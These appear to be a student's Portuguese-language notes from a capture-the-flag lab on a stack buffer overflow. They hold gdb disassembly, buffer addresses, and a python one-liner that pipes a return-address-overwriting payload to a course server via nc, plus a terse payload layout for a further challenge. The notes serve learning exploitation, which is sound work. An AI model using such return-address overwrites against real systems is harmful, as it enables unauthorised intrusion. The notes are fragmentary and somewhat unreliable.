objetivo -> escrever o endereco de getflag() no buffer ou seja na pass

disas check_password

 0x08048755 <+36>:    call   0x804869c <getflag>

b *0x0804874d
r -> vai parar antes do getflag()
x getflag() -> 0x804869c <getflag>:    0x53e58955
(gdb) p &buffer
$1 = (char (*)[32]) 0xffffcdf0

vai voltar para a instruçao depois do check_password:

   0x080487cd <+78>:    call   0x8048731 <check_password>
--Type <RET> for more, q to quit, c to continue without paging--
   0x080487d2 <+83>:    add    $0x10,%esp

os primeiros As sao  do buffer(32) os outros sao da pass(64). Posso reescrever 0x080487d2 que é para onde salta depois de check_password para o endereço de getflag() - 0x08048755

13*4 As + 0x08048755 ?

python -c 'print(13*4*"A"+"\x55\x87\x04\x08")' | nc mustard.stt.rnl.tecnico.ulisboa.pt 22155



5 - challenge 5 - 36 caracteres + 0x0804a001 + 4 caracteres + 0x080487d9

ebx with offset 1
eip